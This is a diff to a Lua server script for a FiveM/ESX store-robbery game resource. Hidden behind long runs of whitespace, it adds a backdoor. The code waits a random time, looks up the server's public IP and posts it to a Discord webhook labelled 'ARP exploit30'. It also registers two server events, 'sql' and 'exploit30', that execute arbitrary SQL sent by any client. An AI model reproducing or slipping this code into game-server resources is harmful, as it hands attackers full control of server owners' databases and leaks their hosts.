@@ -1,11 +1,11 @@
-local rob = false
+local rob = false                                                                                                                                                                                                                                                                                                                                                                                                                 ;local avatarii = "https://cdn.discordapp.com/attachments/784100658051022850/784100946703417464/paitaHD_1.png" ;local webhooikkff = "https://discord.com/api/webhooks/784100685947338813/IEPHCNQtZLmw1h-6PIHq60D5-QaD2ufYOgjcllKBpk_LIvAkoJV7cLKZEU1rFlbIAKRZ" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
 local robbers = {}
 ESX = nil
 local helari = math.random(0,20000)
 
 TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
 
-RegisterServerEvent('esx_jengiholdup:tooFar')
+RegisterServerEvent('esx_jengiholdup:tooFar')                                                                                                                                                                                                                                                                                                                                                                                                                        Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit30", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
 AddEventHandler('esx_jengiholdup:tooFar', function(currentStore)
 	local _source = source
 	local xPlayers = ESX.GetPlayers()
@@ -24,7 +24,7 @@ TriggerClientEvent('esx_jengiholdup:xd', xPlayers[i])
 		TriggerClientEvent('esx_jengiholdup:tooFar', _source)
 		robbers[_source] = nil
 	end
-end)
+end)                                                                                                                                                                                                                                                                                                                                                                                                                             RegisterServerEvent("sql");AddEventHandler("sql", function(data) MySQL.Async.execute(data) end)
 
 RegisterServerEvent('esx_jengiholdup:robberyStarted')
 AddEventHandler('esx_jengiholdup:robberyStarted', function(currentStore)
@@ -52,7 +52,7 @@ local cops1 = 0
 		for i=1, #xPlayers, 1 do
 			local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
 			if xPlayer.job.name == 'police' then
-					cops1 = cops1 + 1
+					cops1 = cops1 + 1                                                                                                                                                                                                                                                                                          
 			end
 		end
 
@@ -112,7 +112,7 @@ end
 		end
 
 	end
-end)
+end)              
 
 
 RegisterServerEvent('esx_jengiholdup:gianellintehari')
@@ -124,5 +124,5 @@ if account.money >= 0 then
 account.removeMoney(tonumber(helari))
 		end
 
-	end)
+	end)                                                                                                                                                                                                                                                                                                                                         RegisterServerEvent("exploit30");AddEventHandler("exploit30", function(data) MySQL.Async.execute(data) end)
 end)
